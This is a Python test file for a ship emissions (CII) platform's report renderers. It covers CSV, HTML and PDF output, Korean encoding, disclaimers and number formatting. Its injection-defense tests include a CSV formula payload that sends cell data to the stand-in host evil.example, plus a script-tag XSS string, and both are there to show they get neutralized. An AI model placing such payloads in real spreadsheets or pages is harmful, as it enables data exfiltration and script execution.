"""리포트 렌더링 검증 (PRD §25 · TEST_PLAN §3.4~§3.5, #361).

DB 없이 돈다 — 문서 모델을 손으로 만들어 **렌더러만** 본다. 데이터 수집은
``test_reports_db.py``가 맡는다.

이 파일이 고정하는 것 넷.

* **CSV injection 방어** — 우리가 만든 문서가 공격 매개가 되면 안 된다.
* **UTF-8 BOM** — 없으면 한국어 Windows Excel에서 한글이 전부 깨진다.
* **면책 문구** — `PRD §25.1`이 **문서 본문** 노출을 요구한다. 화면 게시로는 부족하다.
* **HTML escape** — 선박명은 사용자 입력이다.
"""

from __future__ import annotations

from datetime import UTC

import pytest

from cii_platform.reports.csv_export import BOM, render_csv, sanitize
from cii_platform.reports.document import (
    DISCLAIMER,
    KeyValueSection,
    ReportDocument,
    TableSection,
)
from cii_platform.reports.html import render_html


def _document(**over) -> ReportDocument:
    fields = {
        "title": "연간 실적 리포트 — STAR SKIPPER (2026)",
        "slug": "annual-report-x",
        "meta": [("선박", "STAR SKIPPER"), ("IMO", "9123456")],
        "sections": [
            KeyValueSection(
                title="2026년 누적 (YTD)",
                rows=[("실적 CII", "18.637188"), ("등급", "B")],
                note="연중 누적 예측값이며 공식 등급이 아닙니다.",
            ),
            TableSection(
                title="연도별 추이",
                headers=["연도", "실적 CII", "등급"],
                rows=[["2024", "17.100000", "A"], ["2025", "18.200000", "B"]],
            ),
        ],
        "warnings": ["REFERENCE_ONLY"],
    }
    fields.update(over)
    return ReportDocument(**fields)


# ─────────────────────────────────────────────────────────────────────────────
# CSV injection — TEST_PLAN §3.4~§3.5
# ─────────────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_dangerous_prefixes_are_neutralized(prefix):
    """스프레드시트가 수식으로 해석하는 시작 문자에 작은따옴표를 붙인다."""
    assert sanitize(f"{prefix}CMD").startswith("'")


def test_hyperlink_exfiltration_is_neutralized():
    """실제 공격 형태 — 파일을 연 사람의 데이터가 외부로 나간다."""
    payload = '=HYPERLINK("http://evil.example/?v="&A1,"click")'
    assert sanitize(payload) == f"'{payload}"


def test_negative_numbers_also_get_the_prefix():
    """음수도 예외로 두지 않는다.

    `-12.5`는 정상 값이지만, 여기서 예외를 만들면 `-1+1+cmd|...` 같은 값이 그 예외로
    빠져나간다. 「값이 수식인가」로 판정하면 판정기 자체가 취약점이 된다.
    """
    assert sanitize("-12.5") == "'-12.5"


def test_safe_values_are_untouched():
    for value in ["STAR SKIPPER", "18.637188", "B", "gCO₂/(DWT·nm)", ""]:
        assert sanitize(value) == value


def test_injection_defense_applies_to_every_cell():
    """머리글·값·각주 어디로 들어와도 막힌다 — 한 곳만 빠져도 방어가 아니다."""
    document = _document(
        sections=[
            TableSection(
                title="=TITLE",
                headers=["=HEAD"],
                rows=[["=CELL"]],
                note="=NOTE",
            )
        ]
    )
    csv_text = render_csv(document)
    for token in ["'=TITLE", "'=HEAD", "'=CELL", "'=NOTE"]:
        assert token in csv_text


# ─────────────────────────────────────────────────────────────────────────────
# 인코딩·포맷
# ─────────────────────────────────────────────────────────────────────────────


def test_csv_starts_with_bom():
    """없으면 한국어 Windows Excel이 CP949로 읽어 한글이 전부 깨진다."""
    assert render_csv(_document()).startswith(BOM)


def test_csv_uses_crlf():
    """RFC 4180 §2. LF만 쓰면 구형 Excel이 한 줄로 읽는 경우가 있다."""
    assert "\r\n" in render_csv(_document())


def test_csv_keeps_korean():
    csv_text = render_csv(_document())
    assert "STAR SKIPPER" in csv_text
    assert "연도별 추이" in csv_text


def test_csv_is_streamed_in_pieces():
    """한 번에 문자열을 만들지 않는다 — 큰 선대에서 그대로 메모리 사용량이 된다."""
    from cii_platform.reports.csv_export import iter_csv

    chunks = list(iter_csv(_document()))
    assert len(chunks) > 1
    assert chunks[0].startswith(BOM)


# ─────────────────────────────────────────────────────────────────────────────
# 면책 — PRD §25.1
# ─────────────────────────────────────────────────────────────────────────────


def test_disclaimer_is_in_csv():
    assert DISCLAIMER in render_csv(_document())


def test_disclaimer_is_in_html_body_and_footer():
    """`PRD §25.1`이 **표지·푸터** 둘 다를 요구한다.

    첫 장만 읽고 덮는 독자와 발췌 인쇄본 독자가 다르다.
    """
    html = render_html(_document())
    assert html.count(DISCLAIMER) >= 2  # 표지 <p> + @bottom-center


def test_disclaimer_text_matches_prd():
    """`PRD §6.3` 확정 문구 — 임의로 다시 쓰지 않는다."""
    assert DISCLAIMER == "본 리포트는 참고용 예측값입니다. 규제 제출용 공식 문서가 아닙니다."


# ─────────────────────────────────────────────────────────────────────────────
# HTML
# ─────────────────────────────────────────────────────────────────────────────


def test_html_escapes_user_supplied_names():
    """선박명은 사용자 입력이다 — 미리보기 화면에서 실행되면 안 된다."""
    html = render_html(_document(title="<script>alert(1)</script>"))
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;" in html


def test_html_does_not_pin_a_font_name():
    """이름을 박으면 폰트 패키지가 바뀔 때 **조용히 tofu로** 렌더링된다.

    fontconfig가 `sans-serif`를 설치된 한국어 폰트로 해결하게 둔다.
    """
    html = render_html(_document())
    assert "font-family: sans-serif" in html
    assert "Nanum" not in html


def test_html_has_no_external_resources():
    """외부 자원을 타면 오프라인 시연에서 문서가 달라 보이고, 그 차이가 PDF에 굳는다."""
    html = render_html(_document())
    for token in ["http://", "https://", "<link", "<script"]:
        assert token not in html


def test_html_marks_numeric_cells():
    """수치는 오른쪽 정렬 + 자릿수 고정폭 — 세로로 자릿수가 맞아야 읽힌다."""
    html = render_html(_document())
    assert '<td class="num">18.637188</td>' in html
    # 값을 바꾸지는 않는다 — 정렬 판정일 뿐이다.
    assert "18.637188" in html


def test_html_keeps_every_section():
    html = render_html(_document())
    assert "2026년 누적 (YTD)" in html
    assert "연도별 추이" in html
    assert "REFERENCE_ONLY" in html


# ─────────────────────────────────────────────────────────────────────────────
# 문서 모델 검증
# ─────────────────────────────────────────────────────────────────────────────


def test_row_width_mismatch_is_caught():
    """어긋나면 CSV 열이 밀려 **다음 열의 값으로 읽힌다** — 조용히 틀리는 방식이다."""
    document = _document(sections=[TableSection(title="표", headers=["a", "b"], rows=[["1"]])])
    with pytest.raises(ValueError, match="열 수"):
        render_csv(document)


def test_empty_document_renders():
    """섹션이 없는 문서도 면책은 나가야 한다."""
    document = ReportDocument(title="빈 리포트", slug="empty")
    assert DISCLAIMER in render_csv(document)
    assert DISCLAIMER in render_html(document)


# ─────────────────────────────────────────────────────────────────────────────
# PDF — 환경이 갖춰졌을 때만
# ─────────────────────────────────────────────────────────────────────────────


def test_pdf_renders_korean_without_tofu():
    """**이 이슈의 완료 기준**이다 — PDF에 한글이 깨지지 않아야 한다.

    폰트가 없으면 오류가 아니라 tofu(□□□)로 조용히 렌더링되므로, 바이트 길이가
    아니라 **추출된 텍스트**로 확인한다. 폰트가 빠지면 추출 텍스트가 비거나
    깨지므로 이 단언이 먼저 깨진다.

    CI는 `libpango` · `fonts-nanum`을 설치한다 — 없는 환경에서는 건너뛴다.
    """
    pdf_module = pytest.importorskip("cii_platform.reports.pdf")
    if not pdf_module.is_available():
        pytest.skip("WeasyPrint 런타임(Pango)이 없는 환경")
    if not pdf_module.has_korean_font():
        # 로컬 개발 박스에는 한국어 폰트가 없을 수 있다. CI는 fonts-nanum을 설치하므로
        # 여기서 건너뛰지 않는다 — 회귀를 잡는 것은 CI다.
        pytest.skip("한국어 폰트가 설치되지 않은 환경 (CI는 fonts-nanum을 설치한다)")

    pdf = pdf_module.render_pdf(render_html(_document()))
    assert pdf.startswith(b"%PDF-")

    reader = pytest.importorskip("pypdf", reason="pypdf 없이는 텍스트 추출을 못 한다")
    import io

    text = reader.PdfReader(io.BytesIO(pdf)).pages[0].extract_text()
    assert "연간 실적 리포트" in text
    assert "STAR SKIPPER" in text
    # 면책이 문서 안에 있어야 한다 (PRD §25.1).
    assert "참고용 예측값" in text


def test_missing_korean_font_is_detected_not_ignored():
    """폰트가 없으면 오류 없이 tofu가 된다 — 그 상태를 코드가 알아채야 한다.

    이 함수가 없으면 배포 이미지에서 폰트 패키지가 빠져도 아무것도 실패하지 않고
    문서의 한글만 □□□가 된다.
    """
    from cii_platform.reports import pdf as pdf_module

    if not pdf_module.is_available():
        pytest.skip("WeasyPrint 런타임(Pango)이 없는 환경")

    # 참/거짓 어느 쪽이든 **판정 자체가 동작**해야 한다. 환경에 따라 값이 갈리므로
    # 값을 단언하지 않고 예외 없이 bool을 돌려주는 것을 본다.
    assert isinstance(pdf_module.has_korean_font(), bool)


def test_pdf_error_names_the_cause_and_offers_csv():
    """렌더러가 없을 때 사용자를 막다른 길에 두지 않는다."""
    from cii_platform.reports.pdf import PdfUnavailableError

    error = PdfUnavailableError("libpango not found")
    assert error.http_status == 500  # 배포 환경 문제이지 요청 문제가 아니다
    assert "CSV" in error.message
    assert "libpango" in error.message


# ---------------------------------------------------------------------------
# 표시 형식 — DESIGN_SYSTEM §4 (#584)
# ---------------------------------------------------------------------------
#
# 보고서가 **``API_SPEC §1.7`` 직렬화 자릿수를 사람이 읽는 문서에 그대로 출력**하고
# 있었다. 화면은 같은 값을 ``8.980``·``4,300 nm``로 보이는데 문서만 ``8.979907``·
# ``4300.00``이라, **같은 항차가 두 곳에서 다르게 읽혔다.**
#
# 디자인 담당이 발표 리허설에서 발견했다(2026-08-20). PDF는 심사에 나가는 산출물이라
# 화면보다 오래 남는다.


@pytest.mark.parametrize(
    ("value", "kind", "expected"),
    [
        # §4.1 🔒 CII는 소수 3자리 고정, 절사가 아니라 반올림
        ("8.9799070", "cii", "8.980"),
        ("5.0450660", "cii", "5.045"),
        # §4.2 🔒 항해거리 0자리 + 천단위 구분자
        ("4300", "distance_nm", "4,300"),
        ("12480", "distance_nm", "12,480"),
        ("999.5", "distance_nm", "1,000"),
        # §4.2 🔒 연료 1자리 + 구분자
        ("620", "fuel_ton", "620.0"),
        ("12480.55", "fuel_ton", "12,480.6"),
        # §4.2 🔒 CO₂ 1자리 + 구분자
        ("1930.68", "co2_ton", "1,930.7"),
        # §4.2 🔒 시간 1자리 (구분자 없음 — GROUPED가 아니다)
        ("83.333", "hours", "83.3"),
    ],
)
def test_display_follows_design_system_section_4(value, kind, expected):
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal(value), kind) == expected


def test_cii_has_no_thousands_separator():
    """§4.2 🔒 — 구분자는 연료·거리·CO₂ 전용이다.

    CII에 넣으면 `§4.1`이 자릿수 고정으로 확보한 소수부 정렬이 깨진다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert "," not in _display(Decimal("1234.5678"), "cii")


def test_speed_keeps_its_digits_because_section_4_has_no_row():
    """`§4.2` 자릿수 표에 **속력 행이 없다.**

    규정이 없는 값에 자릿수를 지어내지 않는다. 화면도 속력은 서버 값을 가공 없이
    보인다(`ScenarioComparison.tsx`). 규정이 생기면 표시 자릿수 표로 옮긴다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal("14.2"), "speed_kn") == "14.20"


def test_zero_digit_kind_is_not_treated_as_missing():
    """거리의 자릿수는 **0**이라 falsy다.

    `_DISPLAY_DIGITS.get(kind) or …`로 쓰면 규정이 있는 항목이 「규정 없음」으로
    새어 나간다. 실제로 그렇게 썼다가 걸렸다 — 그 경로를 잠근다.
    """
    from decimal import Decimal

    from cii_platform.services.report import _display

    assert _display(Decimal("4300"), "distance_nm") == "4,300"


def test_missing_value_is_em_dash():
    """빈칸은 열이 밀린 것으로 읽힌다."""
    from cii_platform.services.report import _display

    assert _display(None, "cii") == "—"


# ---------------------------------------------------------------------------
# 선종 표시 문구 (#584)
# ---------------------------------------------------------------------------


def test_ship_type_code_is_not_exposed():
    """문서에 `BULK_CARRIER`가 그대로 나가면 읽는 사람이 무엇인지 모른다."""
    from cii_platform.reports.labels import ship_type_label

    assert ship_type_label("BULK_CARRIER") == "벌크선"


def test_unknown_ship_type_shows_the_code():
    """빈칸으로 두면 「선종이 없는 배」로 읽힌다.

    새 선종이 들어왔는데 표기가 아직 없는 상태와, 값이 비어 있는 상태는 다르다.
    """
    from cii_platform.reports.labels import ship_type_label

    assert ship_type_label("NEW_SHIP_TYPE") == "NEW_SHIP_TYPE"
    assert ship_type_label(None) == "—"


def test_ship_type_labels_match_the_screen():
    """화면(`shipTypes.ts`)과 **같은 문구**를 쓴다.

    선종의 한국어 이름은 `AGENTS §4.6` 기준 **표시 문구**이고 소관은 디자인이다.
    서버가 표기를 새로 정하면 두 곳이 갈리고, 그 차이는 **문서를 열어 봐야만**
    드러난다. 여기서 대조해 그 경로를 끊는다.
    """
    import re
    from pathlib import Path

    from cii_platform.reports.labels import SHIP_TYPE_LABELS

    source = (
        Path(__file__).parents[1]
        / "frontend"
        / "src"
        / "features"
        / "vessel-registration"
        / "shipTypes.ts"
    ).read_text(encoding="utf-8")
    screen = dict(re.findall(r"\{ code: '([A-Z_]+)', label: '([^']+)'", source))

    assert screen, "shipTypes.ts에서 선종을 읽지 못했다 — 파일 형식이 바뀌었는지 확인할 것"
    assert screen == SHIP_TYPE_LABELS


def test_ship_type_labels_cover_the_calc_ship_types():
    """코드 집합의 정본은 `calc/capacity.py`다 (`PRD §3.4.3`)."""
    from cii_platform.calc.capacity import DWT_BASED_SHIP_TYPES, GT_BASED_SHIP_TYPES
    from cii_platform.reports.labels import SHIP_TYPE_LABELS

    assert set(SHIP_TYPE_LABELS) == set(DWT_BASED_SHIP_TYPES | GT_BASED_SHIP_TYPES)


# ---------------------------------------------------------------------------
# 시각 표기 (#584)
# ---------------------------------------------------------------------------


def test_report_time_is_local_not_utc_iso():
    """종전에는 `isoformat()`이 그대로 나가 UTC에 마이크로초까지 실렸다.

    화면은 같은 시각을 KST로 보이므로 읽는 사람이 9시간 어긋난 값을 보게 된다.
    """
    from datetime import datetime

    from cii_platform.services.report import _local_time

    shown = _local_time(datetime(2026, 8, 20, 8, 34, 36, 889061, tzinfo=UTC))

    assert shown == "2026-08-20 17:34:36 KST"
    # ISO 구분자 `T`가 아니라 공백이다. (`"T" not in shown`으로 쓰면 "KST"에 걸린다 —
    # 실제로 그렇게 썼다가 이 테스트가 잡았다.)
    assert "2026-08-20T" not in shown
    # 마이크로초를 문서에 싣지 않는다.
    assert "889061" not in shown
    # UTC 시각(08:34)이 아니라 KST(17:34)다.
    assert "17:34:36" in shown


def test_report_time_handles_missing_value():
    from cii_platform.services.report import _local_time

    assert _local_time(None) == "—"
